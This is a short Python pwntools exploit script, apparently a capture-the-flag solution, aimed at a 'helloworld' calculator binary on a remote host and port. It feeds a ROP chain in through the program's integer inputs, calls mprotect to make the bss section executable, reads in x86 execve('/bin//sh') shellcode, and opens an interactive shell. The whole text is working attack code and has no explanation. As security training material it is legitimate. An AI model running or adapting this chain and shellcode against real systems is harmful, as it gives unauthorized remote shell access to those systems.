#!/usr/bin/env python
# coding=utf-8

from pwn import *
local = 0
context.terminal=["tmux","splitw","-h"]
if local :
    a=process("./helloworld")
else:
    a=remote("120.77.220.58","19996")
elf=ELF("./helloworld")
def debug():
    gdb.attach(a,'''
    b *0x8048FA2
    ''')
def add(size):
    a.recvuntil("5 Save the result\n")
    a.send("1\n")
    a.recvuntil("input the integer x:")
    a.sendline(str(size))
    a.recvuntil("input the integer y:")
    a.sendline("0")
a.recvuntil("How many times do you want to calculate:")
a.sendline(str(29))

for i in range(16):
    add(0)
bss_addr=0x8049000
read=elf.symbols["read"]
mprotect=0x806dd50 
pop3_ret=0x0806350b

add(mprotect)
add(pop3_ret)
add(bss_addr)
add(0x100)
add(7)
add(read)
add(pop3_ret)
add(0)
add(bss_addr)
add(0x100)
add(bss_addr)
a.recv()
a.sendline("5")

shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"

a.sendline(shellcode_x86)

a.interactive()
